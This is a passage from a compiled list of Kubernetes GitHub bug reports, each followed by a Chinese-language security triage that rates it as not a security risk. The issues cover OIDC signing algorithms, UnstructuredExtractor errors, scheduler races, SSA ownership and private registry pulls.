    # 与 --oidc-ca-file 标志引用的文件内容的值相同。
    certificateAuthority: |
      -----BEGIN CERTIFICATE-----
      MIIDxTCCAq2gAwIBAgIEHSYe8TANBgkqhkiG9w0BAQsFADBHMQswCQYDVQQGEwJV
      UzEMMAoGA1UECxMDT3JnMRAwDgYDVQQLEwdFeGFtcGxlMRgwFgYDVQQDEw9jYXMu
      ZXhhbXBsZS5vcmcwHhcNMjQxMDE0MDQ1MTA5WhcNMjUwMTEyMDQ1MTA5WjBHMQsw
      CQYDVQQGEwJVUzEMMAoGA1UECxMDT3JnMRAwDgYDVQQLEwdFeGFtcGxlMRgwFgYD
      VQQDEw9jYXMuZXhhbXBsZS5vcmcwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
      AoIBAQCu5cxJB7oy812FiREeMAuwRY6zOL+Z0fzzL2+yNB62drf8++xSDWRRIzdW
      d6ao4/8OoZoGf6MwmJimeqzJfgIwAFPWKIXQiWTr1pIt3RmGbMWyMieA6pTu03oa
      dYgDxliPaKyqK3lauQ3hIxOBX5igS+ZFwP00t/KYZLaUYq90E0CfkaaMxDRHpyFa
      L/NTlx7fDe4iJv5e43XqU6mmHxHtdSYkHCXRKb2eqZzipOL4/T9KqyICEOK26mnB
      LDMuGUOhuqTw2/eEcAzpFotu12sYjywe9sbTJZEjVyXpCyIf06A2mh1RzqYZrcdX
      KKu6P2t+Fl5wVwHmr07nUffVjfJdAgMBAAGjgbgwgbUwHQYDVR0OBBYEFAi6kyO7
      eASBkHz1X4mlqvU3ERm7MIGTBgNVHREEgYswgYiCD2Nhcy5leGFtcGxlLm9yZ4IU
      Y2FzYWRtaW4uZXhhbXBsZS5vcmeCFWNhcy1zZXJ2ZXItYm9vdC1hZG1pboIjY2Fz
      LXNlcnZlci0wLmNhcy1zZXJ2ZXIuZGVmYXVsdC5zdmOCI2Nhcy1zZXJ2ZXItMS5j
      YXMtc2VydmVyLmRlZmF1bHQuc3ZjMA0GCSqGSIb3DQEBCwUAA4IBAQA9SR55kjOK
      abIbEFthdg2djwydlBysVyu+C1YQ5ratdryVgnbG9zjsLphGzYXSwdsOjw8VdZiu
      Fk4bEm/6+sFtksMfLza6OJj/Mq0JPTiDQAnvokBgJBllJJmerAbeKwMmpiuYFZPS
      j1A7456JrHnl9T/QREuqYAWt7oyXHKrorLjuPjoe1bqgE/lgIIvDtTuPMrZ3rO/T
      WC4HbBvpm61w1osZzqjitV+qzZkZ50z2oLdkISPaXxWVS5feNga8imijQ4zBMC25
      Ni0pI/FSU7Lx/sP2bSjuC/8H/FBUpeSlzh37/ZRd6H6eR5zw75LykDF85+5L2oNd
      LrfEiw8rsu+s
      -----END CERTIFICATE-----
    # audiences 是 JWT 必须发布给的一组可接受的受众。
    # 至少其中一项必须与所提供的 JWT 中的 “aud” 声明相匹配。
    audiences:
    - kubernetes # 与 --oidc-client-id 一致。
    # 当指定多个受众时，需要将此字段设置为 “MatchAny”。
    #audienceMatchPolicy: MatchAny
  # 用于验证令牌声明以对用户进行身份认证的规则。
  #claimValidationRules:
    # 与 --oidc-required-claim key=value 一致
  #- expression: 'claims.exp - claims.nbf <= 86400'
  #  message: total token lifetime must not exceed 24 hours
  claimMappings:
    # username 表示用户名属性的选项。
    # 这是唯一必需的属性。
    username:
      # 与 --oidc-username-claim 相同，与 username.expression 互斥。
      claim: "preferred_username"
      # 与 --oidc-username-prefix 相同，与 username.expression 互斥。
      # 如果设置了username.claim，则需要username.prefix。
      # 如果不需要前缀，可显式将其设置为 ""。
      prefix: "oidc-"
      # 与 username.claim 和 username.prefix 互斥。
      # expression 是计算结果为字符串的 CEL 表达式。
      #
      # 1.  如果 username.expression 使用 “claims.email”，则必须在 username.expression
      #     或 extra[*].valueExpression 或 ClaimValidationRules[*].expression 中使用 “claims.email_verified”。
      #     与 username.claim 设置为 “email” 时自动应用的验证相匹配的示例声明验证规则表达式是
      #     “claims.?email_verified.orValue(true)”。
      # 2.  如果根据 username.expression 断言的用户名是空字符串，则身份认证请求将失败。
      #expression: '"oidc:"+claims.preferred_username'
    # groups 代表 groups 属性的一个选项。
    groups:
      # 与 --oidc-groups-claim 相同，与 groups.express 互斥。
      #claim: "user_groups"
      # 与 --oidc-groups-prefix 相同。与 groups.express 互斥。
      # 如果设置了 groups.claim，则需要 groups.prefix。
      # 如果不需要前缀，则显式将其设置为 ""。
      #prefix: "oidc-"  #Invalid value: \"oidc-\": prefix can't be set when expression is set"
      # 与 groups.claim 和 groups.prefix 互斥。
      # expression 是一个计算结果为字符串或字符串列表的 CEL 表达式。
      expression: 'claims.group_name.split(",").map(g, "oidc-" + g)'
    # uid 表示 uid 属性的一个选项。
    uid:
      # 与 uid.expression 互斥。
      claim: 'preferred_username'
      # 与 uid.claim 互斥
      # expression 是计算结果为字符串的 CEL 表达式。
      #expression: 'claims.preferred_username'
  # 应用于最终用户对象的验证规则。
  userValidationRules:
    # expression 是一个计算结果为布尔值的 CEL 表达式。
    # 所有表达式的计算结果必须为 true，用户才有效。
  - expression: "!user.username.startsWith('system:')"
    # Message 自定义验证失败时在 API 服务器日志中看到的错误消息。
    message: 'username cannot used reserved system: prefix'
  - expression: "user.groups.all(group, !group.startsWith('system:'))"
    message: 'groups cannot used reserved system: prefix'
```

```
E1020 08:34:22.274226       1 authentication.go:73] "Unable to authenticate the request" err="[invalid bearer token, oidc: verify token: failed to verify signature: failed to verify id token signature]"
```

#### What did you expect to happen?

command execute right

#### How can we reproduce it (as minimally and precisely as possible)?

config AuthenticationConfiguration  with oidc provider with signing-algs is RS512


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

1.31.0

</details>


#### Cloud provider

<details>
wmware workstation
</details>


#### OS version

<details>

ubuntu 2404

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了在使用AuthenticationConfiguration配置OIDC认证时，无法指定签名算法（signing-algs），导致当OIDC提供者使用非默认签名算法（如RS512）时，认证失败。这是一个配置问题，并没有涉及潜在的安全风险。根据提供的信息，认证失败并未导致未授权访问或其他安全问题。

---

## Issue #128201 Cannot create UnstructuredExtractor - duplicate entry for /v1, Kind=APIResourceList

- Issue 链接：[#128201](https://github.com/kubernetes/kubernetes/issues/128201)

### Issue 内容

#### What happened?

I am trying to create an `UnstructuredExtractor`, with the following code (error handling omitted for brevity):

```go
	dynamic, _ := provider.MakeDynamicClient(kubeconfig)
	discovery, _ := provider.MakeDiscoveryClient(kubeconfig)
	extractor, err := acmetav1.NewUnstructuredExtractor(discovery)
```

After this code `err != nil`, with the following error:

```
failed generating initial GVK Parser: duplicate entry for /v1, Kind=APIResourceList
```

Stepping through with a debugger, the stack trace seems to be:
- In [`NewUnstructuredExtractor`](https://github.com/kubernetes/kubernetes/blob/4f796c02f77fb95d42cd161ea663dd1bf05e372f/staging/src/k8s.io/client-go/applyconfigurations/meta/v1/unstructured.go#L96)
- In [`regenerateGVKParser`](https://github.com/kubernetes/kubernetes/blob/4f796c02f77fb95d42cd161ea663dd1bf05e372f/staging/src/k8s.io/client-go/applyconfigurations/meta/v1/unstructured.go#L69)
- In [`NewGVKParser`](https://github.com/kubernetes/kubernetes/blob/4f796c02f77fb95d42cd161ea663dd1bf05e372f/staging/src/k8s.io/apimachinery/pkg/util/managedfields/gvkparser.go#L73)

#### What did you expect to happen?

I expect to get an `UnstructuredExtractor`, that I can use to extract fields from an object that were set by my CLI tool.

#### How can we reproduce it (as minimally and precisely as possible)?

This can be reproduced against a `v1.30` or newer (`1.29` is not affected) [kind](https://kind.sigs.k8s.io/) cluster.

```bash
kubectl apply --server-side -f https://raw.githubusercontent.com/projectcalico/calico/v3.28.2/manifests/tigera-operator.yaml
cat <<EOF | kubectl apply --server-side -f -
apiVersion: operator.tigera.io/v1
kind: Installation
metadata:
  name: default
spec: {}
---
apiVersion: operator.tigera.io/v1
kind: APIServer
metadata:
  name: default
spec: {}
EOF
```

This causes the duplication of the `APIResourceList` definition.

Then, it is no longer possible to create an `UnstructuredClient` against the cluster using the code above.

#### Anything else we need to know?

I suspect the bug is in `client-go`, and that `UnstructuredExtractor` should be constructable even in the presence of duplicate resources. I'm not sure if it is possible for the Calico API server to avoid this duplication, given that it supports both `1.29` and `1.30`.

It's also possible that I'm building the `UnstructuredExtractor` wrong, I wasn't able to find many examples.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

None

#### OS version

N/A (reproduces on kind)

#### Install tools

https://kind.sigs.k8s.io/

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue描述的是在创建`UnstructuredExtractor`时遇到了重复的`/v1, Kind=APIResourceList`的问题。这是由于在集群中部署了Calico的operator造成了资源重复定义，导致了客户端调用时的错误。这属于软件兼容性或配置问题，并未涉及任何安全风险。根据风险判断标准，此Issue不涉及安全问题。

---

## Issue #128198 externalTrafficPolicy: local Reverts to cluster When Cluster Lacks PreferDualStack Support

- Issue 链接：[#128198](https://github.com/kubernetes/kubernetes/issues/128198)

### Issue 内容

#### What happened?

In Kubernetes clusters that do not support PreferDualStack networking, the externalTrafficPolicy: local setting for services is not honored. Instead, the traffic policy reverts to the default externalTrafficPolicy: cluster, which can lead to unintended traffic routing and source IP loss.

#### What did you expect to happen?

The service should honor the externalTrafficPolicy: local setting, ensuring that traffic is routed only to the local node where the service endpoints are available, preserving the client source IP.

#### How can we reproduce it (as minimally and precisely as possible)?

Deploy this to single-stack cluster
```
apiVersion: v1
kind: Service
metadata:
  name: dual-stack-service
  namespace: default
spec:
  ipFamilyPolicy: PreferDualStack
  ipFamilies:
    - IPv4
    - IPv6
  selector:
    app: my-app
  ports:
    - protocol: TCP
      port: 80
      targetPort: 8080
  externalTrafficPolicy: Local
  type: LoadBalancer

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在单栈Kubernetes集群中，当集群不支持`PreferDualStack`网络策略时，服务配置的`externalTrafficPolicy: Local`设置没有被正确遵循，而是回退到了默认的`externalTrafficPolicy: Cluster`。这可能导致意外的流量路由和客户端源IP丢失。

`externalTrafficPolicy: Local`的作用是确保流量仅路由到本地有可用端点的节点，并保留客户端的源IP地址。如果该设置未被遵循，可能会影响到需要源IP信息的应用程序，如日志记录、基于IP的访问控制等。

然而，这一问题并不导致任何可被攻击者利用的安全漏洞。它不会引起权限提升、命令执行、容器逃逸等高风险安全问题。此问题属于功能性缺陷，影响了服务的预期行为，但不涉及安全风险。

根据提供的风险判断标准，此Issue不涉及安全风险。

---

## Issue #128173 When is the directory created? /var/lib/kubelet/pods/{podUID}/container 

- Issue 链接：[#128173](https://github.com/kubernetes/kubernetes/issues/128173)

### Issue 内容

#### What happened?

An empty file named cb6f3303 exists in the /var/lib/kubelet/pods/d425bb07-0dac-409d-ba2d-242afbc213eb/containers/init directory. Is this file created by kubelet or when the container runtime? If it was created by kubelet, where is the code?

#### What did you expect to happen?

I want to know when the files under /var/lib/kubelet/pods/d425bb07-0dac-409d-ba2d-242afbc213eb/containers/init are created.

#### How can we reproduce it (as minimally and precisely as possible)?

View Directory /var/lib/kubelet/pods/d425bb07-0dac-409d-ba2d-242afbc213eb/containers/init

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.28
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue的提交者询问在Kubernetes的`/var/lib/kubelet/pods/{podUID}/containers/init`目录下出现的一个空文件`cb6f3303`的创建时机，是否由kubelet或容器运行时创建，并希望了解具体的代码位置。此问题只是对Kubernetes内部文件生成机制的技术性提问，没有涉及任何安全风险，也未暴露敏感信息或存在漏洞。根据风险判断标准第6条：如果Issue不涉及安全问题，则风险评级判断为不涉及。

---

## Issue #128171 [Failing Tests] ci-crio-cgroupv1-node-e2e-conformance.Overall (impacting multiple jobs)

- Issue 链接：[#128171](https://github.com/kubernetes/kubernetes/issues/128171)

### Issue 内容

#### Which jobs are failing?
* master-blocking:
  * ci-crio-cgroupc1-node-e2e-conformance
  * ci-node-e2e
  * gce-cos-master-scalability-100

#### Which tests are failing?
Node conformance test

ci-crio-cgroupv1-node-e2e-conformance.Overall

#### Since when has it been failing?
[10/17 10:52 CDT](https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-crio-cgroupv1-node-e2e-conformance/1846942196620595200)

#### Testgrid links
https://testgrid.k8s.io/sig-release-master-blocking#ci-crio-cgroupc1-node-e2e-conformance
https://testgrid.k8s.io/sig-release-master-blocking#ci-node-e2e
https://testgrid.k8s.io/sig-release-master-blocking#gce-cos-master-scalability-100

#### Reason for failure (if possible)
```
{ failed [FAILED] system validation
Expected success, but got an error:
    <*fmt.wrapError | 0xc001490e80>: 
    system validation failed: exit status 1
    {
        msg: "system validation failed: exit status 1",
        err: <*exec.ExitError | 0xc001490e60>{
            ProcessState: {
                pid: 3129,
                status: 256,
                rusage: {
                    Utime: {Sec: 0, Usec: 184345},
                    Stime: {Sec: 0, Usec: 64265},
                    Maxrss: 98988,
                    Ixrss: 0,
                    Idrss: 0,
                    Isrss: 0,
                    Minflt: 11248,
                    Majflt: 0,
                    Nswap: 0,
                    Inblock: 0,
                    Oublock: 0,
                    Msgsnd: 0,
                    Msgrcv: 0,
                    Nsignals: 0,
                    Nvcsw: 953,
                    Nivcsw: 287,
                },
            },
            Stderr: nil,
        },
    }
In [SynchronizedBeforeSuite] at: k8s.io/kubernetes/test/e2e_node/e2e_node_suite_test.go:232 @ 10/17/24 16:09:25.314
}
```
and
```
{ failed [FAILED] �[1m�[38;5;9mSynchronizedBeforeSuite failed on Ginkgo parallel process #1�[0m
  The first SynchronizedBeforeSuite function running on Ginkgo parallel process
  #1 failed.  This suite will now abort.

In [SynchronizedBeforeSuite] at: k8s.io/kubernetes/test/e2e_node/e2e_node_suite_test.go:230 @ 10/17/24 16:09:25.322
}
```

#### Anything else we need to know?
Since commit 9568a2ac1 traced back to this PR: https://github.com/kubernetes/kubernetes/pull/128149

#### Relevant SIG(s)
/sig node
/milestone 1.32
/kind failing-test
cc: @kubernetes/release-team-release-signal 



### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了一些CI测试失败的情况，包括`ci-crio-cgroupv1-node-e2e-conformance`等Job，错误信息显示系统验证失败，但并未暴露任何敏感信息或潜在的安全风险。错误信息中提到的路径`k8s.io/kubernetes/test/e2e_node/e2e_node_suite_test.go`是公开的代码路径，不存在敏感信息泄露。Issue的内容主要涉及测试失败的排查，不涉及安全风险。

---

## Issue #128164 Race when scheduling statefulset pods with local PV, resulting in pods pending forever

- Issue 链接：[#128164](https://github.com/kubernetes/kubernetes/issues/128164)

### Issue 内容

#### What happened?

A statefulset has a volumeclaimtemplate which uses a local PV storage class. The PVs created by this storage class are tightly bound to a single node.

In this example lets say that ordinal 0 of the statefulset is running on node A with a PVC which is bound to a PV on node A as well.

1. delete the PVC for ordinal 0
2. immediately after, delete the pod for ordinal 0
3. the new pod for ordinal 0 gets scheduled on node A
4. the new PVC/PV for ordinal 0 gets bound to node B
5. the new pod is stuck in Pending state forever since the new PVC is only available on node B

I believe the issue is that the scheduler when scheduling the new pod is looking at the OLD PVC object which is the progress of being deleted. Since PVCs are referenced by name and statefulsets use consistent naming for PVCs, the scheduler can use the old PVC definition when doing Filter decisions.
This can happen if the pod informer/watcher in the scheduler is ahead of the pvc informer/watcher.

#### What did you expect to happen?

The scheduler should not place pods using local PVs in an unschedulable state.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a statefulset with a local PVC claimref. Delete the pod and pvc for an ordinal at the same time. Retry until the pod is stuck in Pending state.

#### Anything else we need to know?

Thinking about possible solutions:
1. in the scheduler, do not use deleting PVCs/PVs when placing the pod. this does not fix the race but it most likely reduces the frequency
2. in the scheduler, form a consistent snapshot where all objects used in scheduling decisions are from the same ETCD revision (I tried to see if there is anything in the k8s project that does this but I couldn't find anything)
3. in the statefulset controller, create an owner reference on PVCs to owning pod. during scheduling, if the PVC is not owned by the pod being scheduled, backoff.

#### Kubernetes version

<details>

```console
$ kubectl version
1.29.9
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue描述了在使用本地持久卷（Local PV）的StatefulSet中，删除PVC和Pod时可能出现调度竞态条件，导致Pod永远处于Pending状态。这是由于调度器可能基于正在删除的旧PVC信息进行决策，导致Pod被调度到错误的节点。

根据风险判断标准：

1. 该问题需要有权限删除PVC和Pod的操作，属于正常的集群管理操作。
2. 该问题不会被攻击者利用来造成权限提升、数据泄露或远程代码执行等高危安全问题。
3. 不涉及日志泄露敏感信息。
4. 不属于拒绝服务攻击中的高风险场景，因为需要有较高权限的操作才能触发。

因此，此Issue不涉及安全风险。

---

## Issue #128151 Control-plane unexpected node to "Not Ready"

- Issue 链接：[#128151](https://github.com/kubernetes/kubernetes/issues/128151)

### Issue 内容

#### What happened?

#### What happened?

Server running fine and seems unexpected lost of connection, I have attached the main logs of messages, and I will explain my analysis:
Sep 26 07:11:39 kubelet started to show "Error updating node status"

At 07:12:00 Lost connection with the pods running in qos1

Sep 26 07:12:03 kubelet shows that update node exceeds retry count.

The logs repeat again and again.

Sep 26 07:16:25 qos1 sssd_be[1077]: Backend is offline

And almost 6 hours later  qos server got reconnected and I can access the server.

One thing that catches my attention is  the following log:
Sep 26 13:11:10 qos1 Keepalived_vrrp[1512]: Interface cali9f8d8b57766 deleted

Nominally there is always a previous log indicating that the inteface cali****** has been added but for cali9f8d8b57766 interface it does not show.

Keepalived has been working perfectly and it does not show any restart or shutdown.

[logs.txt](https://github.com/user-attachments/files/17409957/logs.txt)



#### What did you expect to happen?

It should not occur and or at least not lose connection with the server.  The node was not ready and recovered itself after almost 6 hours.

#### How can we reproduce it (as minimally and precisely as possible)?

I have 9 nodes, 3 control-plane, master and 6 workers.
qos1 is one of the 3 control-plane, master

#### Anything else we need to know?

This is the second time this occurs, first time the node was ready instantly but this time the node was "Not Ready" for almost 6 hours. 
The other 2 nodes [control-plane, master] have not shown this behavior. 

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"20", GitVersion:"v1.20.0", GitCommit:"af46c47ce925f4c4ad5cc8d1fca46c7b77d13b38", GitTreeState:"clean", BuildDate:"2020-12-08T17:59:43Z", GoVersion:"go1.15.5", Compiler:"gc", Platform:"linux/amd64"}
(machine is running in 2020 so ignore date)
```
</details>


#### Cloud provider

<details>
Bare metal
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Oracle Linux Server"
VERSION="8.5"
ID="ol"
ID_LIKE="fedora"
VARIANT="Server"
VARIANT_ID="server"
VERSION_ID="8.5"
PLATFORM_ID="platform:el8"
PRETTY_NAME="Oracle Linux Server 8.5"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:oracle:linux:8:5:server"
HOME_URL="https://linux.oracle.com/"
BUG_REPORT_URL="https://bugzilla.oracle.com/"

ORACLE_BUGZILLA_PRODUCT="Oracle Linux 8"
ORACLE_BUGZILLA_PRODUCT_VERSION=8.5
ORACLE_SUPPORT_PRODUCT="Oracle Linux"
ORACLE_SUPPORT_PRODUCT_VERSION=8.5
$ uname -a
Linux qos2 5.4.17-2011.7.4.el8uek.x86_64 #2 SMP Fri Oct 2 14:39:04 PDT 2020 x86_64 x86_64 x86_64 GNU/Linux
(machine is running in 2020 so ignore date)
```
</details>

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了一个Kubernetes集群中控制平面节点意外进入"Not Ready"状态的问题，出现了kubelet无法更新节点状态、连接丢失、sssd后端离线等情况。这些症状表明节点可能存在网络中断、服务异常或硬件故障等问题。从描述来看，没有涉及到潜在的安全风险，也没有提及任何可能被攻击者利用的漏洞。

根据风险判断标准：

1. 该风险不能被攻击者利用。
2. 不涉及可能被分配CVE编号的漏洞。
3. Issue提交者没有暴露敏感信息。
6. Issue不涉及安全问题，风险评级判断为不涉及。

---

## Issue #128141 Sts pod pending in scheduler cache

- Issue 链接：[#128141](https://github.com/kubernetes/kubernetes/issues/128141)

### Issue 内容

#### What happened?

1 . we found the mysql pod is pending , but its pvc is already bounded, the pods show as follows
```
[root@sphere-node-1 ~]# kubectl get po -n mysql
NAME                                   READY   STATUS    RESTARTS   AGE
mysql-0-0                         0/1     Pending   0          4h4m
mysql-1-0                         1/1     Running   0          15d
mysql-2-0                         1/1     Running   0          5h7m
mysql-exporter-7c45cbc7b7-9dfh4   1/1     Running   0          15d
[root@sphere-node-1 ~]# kubectl get pvc -n mysql
NAME                 STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS                        AGE
mysql-0-0   Bound    pvc-114695a3-885e-4a87-9e7d-75d76cf059e5   50Gi       RWO            hostpath-data-meta             15d
mysql-1-0   Bound    pvc-0f186afd-bb87-4b3a-97a7-5aae6f071c3f   50Gi       RWO            hostpath-data-meta             15d
mysql-2-0   Bound    pvc-cd92c657-3c88-46e8-8352-22d5ecb46fe9   50Gi       RWO            hostpath-data-meta             5h7m



I1016 06:29:42.137250       1 schedule_one.go:826] "Unable to schedule pod; no fit; waiting" pod="mysql/mysql-0-0" err="0/5 nre available: 1 node(s) didn't match pod anti-affinity rules, 2 node(s) didn't match Pod's node affinity/selector, 2 node(s) had volumeaffinity conflict. preemption: 0/5 nodes are available: 1 node(s) didn't match pod anti-affinity rules, 4 Preemption is not helpful foruling."

```

2. But the sheduler cache info shows the  one mysql-2-0  is Running in node-6, and one mysql-2-0  is pending in node-3
```
Node name:  node-6
name: ccos-mysql-2-0, namespace: ccos-mysql, uid: cd835665-9889-4e04-8c75-05b7ae984dc9, phase: Running, nominated node:

Node name:  node-3
name: ccos-mysql-2-0, namespace: ccos-mysql, uid: 2a3ab7ba-a9c1-404d-b4e4-e7dcfd91578c, phase: Pending, nominated node:

 1 dumper.go:62] "Dump of scheduling queue" pods=<
        name: ccos-mysql-0-0, namespace: ccos-mysql, uid: f10be0d0-c41d-4629-a8ce-4002ecf8b4c3, phase: Pending, nominated node:

```

#### What did you expect to happen?

The sts pod should not exists in Running and Pending state at the same time

#### How can we reproduce it (as minimally and precisely as possible)?

remove one sts pod and try to create one new

related to https://github.com/kubernetes/kubernetes/issues/121866

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.25.8

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
5.15.131-9
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了Kubernetes集群中StatefulSet（sts）Pod在调度过程中出现了缓存不一致的情况，导致同一个Pod同时处于Pending和Running状态。这可能是由于调度器缓存未及时更新引起的调度异常。然而，根据提供的风险判断标准，此问题不涉及安全风险：

1. 该问题属于调度器的功能性Bug，并不能被攻击者利用来获得未授权的访问或权限提升。
2. 没有迹象表明此问题会导致命令执行、容器逃逸、提权等高安全风险的问题。
3. 此问题不会导致敏感信息泄露、拒绝服务（DoS）攻击等安全事件。

因此，综合判断，该Issue不涉及安全风险。

---

## Issue #128102 Unable to SSA remove array entry containing nested field with "foreign" owner

- Issue 链接：[#128102](https://github.com/kubernetes/kubernetes/issues/128102)

### Issue 内容

#### What happened?

We are in the process of removing a long-time deprecated API version in one of our internal operators. We have done this process before, and are familiar with how it should be done. But since then, we have migrated all our code to use SSA. While this in general has been a pleasant experience, we hit a major issue when our CI/CD pipeline attempted to delete obsolete webhooks from our webhook configuration resources (using SSA). We have both validating and mutating webhooks. The same error was reported for both, and I will use the validating webhook in the following description.

When the pipeline attempts to SSA the webhook configuration, we got the following error:

````
Error from server (Invalid): ValidatingWebhookConfiguration.admissionregistration.k8s.io "application-operator-validating-webhook-configuration" is invalid: [webhooks[2].sideEffects: Required value: must specify one of None, NoneOnDryRun, webhooks[2].clientConfig: Required value: exactly one of url or service is required, webhooks[2].admissionReviewVersions: Required value: must specify one of v1, v1beta1]
````

Pretty cryptic error message, but I am pretty sure this is caused by "foreign" ownership to selected nested fields in the array item that the pipeline is trying to remove, making the item retain with invalid configuration and thus rejected by the SSA. Looking at the managed fields confirms my suspicion:

````yaml
managedFields:
    - manager: cert-manager-cainjector
      operation: Apply
      apiVersion: admissionregistration.k8s.io/v1
      time: '2024-09-03T08:00:49Z'
      fieldsType: FieldsV1
      fieldsV1:
        'f:webhooks':
          'k:{"name":"v1alpha1-stasjob-validator.stas.statnett.no"}':
            .: {}
            'f:clientConfig':
              'f:caBundle': {}
            'f:name': {}
          'k:{"name":"v1beta2-application-validator.stas.statnett.no"}':
            .: {}
            'f:clientConfig':
              'f:caBundle': {}
            'f:name': {}
          'k:{"name":"v1beta2-stasjob-validator.stas.statnett.no"}':
            .: {}
            'f:clientConfig':
              'f:caBundle': {}
            'f:name': {}
````

As we use cert-manager to inject the webhook CA bundle, it owns a single nested field in each array item as expected. Note: We have enabled the ServerSideApply feature gate in cert-manager, if that matters.

#### What did you expect to happen?

I would expect the obsolete/removed webhook to be removed without error from the array of webhooks in the webhook configuration resource.

#### How can we reproduce it (as minimally and precisely as possible)?

There are probably many ways to reproduce this issue. But to reproduce the issue in the same context as us, I would suggest the following:

1. Install cert-manager with mostly default options. We have enabled the c-m ServerSideApply feature gate, but I don't think it matters.
2. Add/update a ValidatingWebhookConfiguration containing at least two webhooks **using SSA**.
3. Create a cert-manager `Certificate` for your webhook.
4. Request injection of webhook CA bundle by cert-manager ca-injector adding an annotation to the VWC: `cert-manager.io/inject-ca-from: $(CERTIFICATE_NAMESPACE)/$(CERTIFICATE_NAME)`
5. Wait for cert-manager to reconcile the VWC (`caBundle` should be injected)
6. Attempt to remove one of the webhooks from the VMC, still **using SSA**:

#### Anything else we need to know?

This issue was initially raised on sig-api-machinery Slack: https://kubernetes.slack.com/archives/C0EG7JC6T/p1728996348284339

It is also worth mentioning that a temporary rollback to use client-side apply (a.k.a. Update) in our pipeline appears as a workaround for this issue. We successfully used this approach to finalize our removal of the obsolete API version.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.8+632b078
```

</details>


#### Cloud provider

<details>
N/A OpenShift on VMWare
</details>


#### OS version

<details>

N/A RCOS (OpenShift)

</details>


#### Install tools

<details>
N/A
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
N/A
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用服务器端应用(SSA)时，无法删除含有由其他管理者拥有的嵌套字段的数组项的问题。具体来说，当cert-manager注入了`caBundle`字段并拥有该字段后，试图通过SSA删除包含该字段的数组项会导致错误。这似乎是由于SSA的字段所有权机制引起的。

从安全角度来看，此问题并未涉及到可被攻击者利用的安全漏洞。删除Webhook配置需要足够的权限，且该问题不会导致权限提升、敏感信息泄露或远程代码执行等高风险安全问题。因此，该Issue不涉及安全风险。

---

## Issue #128057 Kubernetes cannot pull from a Private Registry deployed with ClusterIP

- Issue 链接：[#128057](https://github.com/kubernetes/kubernetes/issues/128057)

### Issue 内容

#### What happened?

I'm hosting a private registry using Harbor like such like such:

Link to Harbor Ticket, but I believe this is a kubernetes issue or limitation: https://github.com/goharbor/harbor-helm/issues/1838

I deploy it via a Helmfile

```
# helmfile.dev.yaml
repositories:
  - name: harbor
    url: https://helm.goharbor.io

releases:
  - name: harbor
    chart: harbor/harbor
    namespace: harbor
    values:
      - expose:
          type: clusterIP
        externalURL: "http://harbor.harbor.svc.cluster.local:80"
        persistence:
          enabled: true
          persistentVolumeClaim:
            registry:
              size: 10Gi
```

